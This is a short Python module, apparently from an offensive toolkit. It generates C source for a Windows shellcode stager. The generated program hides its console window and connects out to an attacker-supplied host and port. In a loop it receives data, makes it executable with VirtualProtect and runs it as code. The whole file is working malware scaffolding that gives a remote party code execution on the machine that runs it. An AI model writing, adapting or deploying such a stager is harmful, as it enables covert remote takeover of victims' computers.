# -*- coding: utf-8 -*-

"""
Author: mosin <hucmoxing@163.com>

说明:此模块为客户端接受Shellcode程序，当Shellcode存在EXIT函数时，程序将退出，
接管权交给Shellcode
"""

def write_code(lport,lhost):
    
    code_info = '''
    #include <stdio.h>                      
    #include <winsock2.h>                  
    #include <Windows.h>                   
    #pragma comment (lib, "ws2_32")        

    typedef struct sockaddr_in sockaddr_in;

    int sock_test(char *shellcodes)
    {
            char *shellcode =shellcodes;
            DWORD why_must_this_variable;
            BOOL ret = VirtualProtect (shellcode, strlen(shellcode),
            PAGE_EXECUTE_READWRITE, &why_must_this_variable);
            if (!ret) {
                    return 0;
            }
            ((void (*)(void))shellcode)();
            return 0;
    }	

    int main()
    {
        ShowWindow(FindWindow("ConsoleWindowClass",0),0);
        Sleep(2000);                   
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in sockaddr;
        sockaddr.sin_family=AF_INET;
        sockaddr.sin_port=htons(%s);
        sockaddr.sin_addr.S_un.S_addr=inet_addr("%s");
        connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));
        while(TRUE)
        {
            while(TRUE)
            {
                char buffer[MAXBYTE]={0};
                recv(s, buffer, MAXBYTE, NULL);
                if (buffer == NULL)
                {
                    continue;
                }
                else 
                {
                    sock_test(buffer);
                }

            }
        }
        closesocket(s);
        WSACleanup();
        getchar();
        exit(0);
    }
    ''' % (lport,lhost)
    return code_info
